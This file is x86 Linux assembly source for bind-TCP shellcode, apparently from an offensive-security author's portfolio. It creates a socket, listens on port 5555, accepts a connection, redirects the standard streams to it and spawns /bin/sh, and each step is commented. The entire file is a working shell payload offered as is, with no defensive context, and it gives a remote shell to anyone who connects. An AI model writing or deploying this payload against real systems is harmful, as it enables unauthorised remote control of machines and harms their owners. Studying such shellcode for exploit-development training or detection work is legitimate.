;Author: sagaroffsec (VL43CK)
;File Name: bindTCP-Shellcode.nasm
;Website: https://sagaroffsec.com
;Description: binds on a given TCP port and spawn a shell 

global _start

section .text

_start:

	;creating socket
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	
	; socket(PF_INET, SOCK_STREAM, IPPROTO_IP) 
	
	mov al, 0x66	;socketcall()
	mov bl, 0x1	;SYS_SOCKET
	push edx	;PROTOCOL = 0
	push ebx	;for SOCK_STREAM = 1
	push byte 0x2	;PF_INET
	mov ecx, esp	;socketcall system call
	int 0x80	;socket(AF_INET, SOCK_STREAM, 0)
	mov esi, eax	;saving sockfd in esi

	;binding on any address 
	;bind(sockfd, {sa_family=AF_INET, sin_port=htons(5555), sin_addr=inet_addr("0.0.0.0")}, 16)

	mov al, 0x66	;socketcall()
	mov bl, 0x2	;SYS_BIND
	push edx	;for any address (0.0.0.0)
	push word 0xb315	;to bind on port (5555)
	push bx		;AF_INET &
	mov ecx, esp	;ECX points to sockaddr
	push byte 0x10	;size of address #sockaddr (16 = 0x10) &
	push ecx	;pointer to sockaddr
	push esi	;sockfd
	mov ecx, esp	;bind args
	int 0x80

	;starting listening
	;listen(sockfd, 2)
	
	push ebx	;queuelimit = 2
	push esi	;sockfd
	mov ecx, esp	;listen args
	mov bl, 0x4	;SYS_LISTEN
	mov al, 0x66	;socketcall()
	int 0x80

	;accept connections
	;accept(sockfd, NULL, NULL)

	mov al, 0x66	;socketcall()
	mov bl, 0x5	;SYS_ACCEPT
	push edx	;NULL
	push edx	;NULL
	push esi	;sockfd
	mov ecx, esp	;accept args
	int 0x80

	;dup2(ebx, {0,1,2}

	xchg ebx, eax	;EAX = 5, EBX = new_sockfd
	xor ecx, ecx
dup_loop:
	mov al, 0x3f	;dup2
	int 0x80
	inc ecx		;Iterate over {0,1,2}
	cmp cl, 0x3	;check if Complete;
	jne dup_loop	;jump to loop	

	;execve("//bin/sh", NULL, NULL)

	push edx	;NULL terminated
	push 0x68732f6e
	push 0x69622f2f	;pushing "//bin/sh" in stack
	mov ebx, esp	;points to "//bin/sh" in stack
	mov ecx, edx	;NULL
	mov al, 0xb	;execve
	int 0x80


	

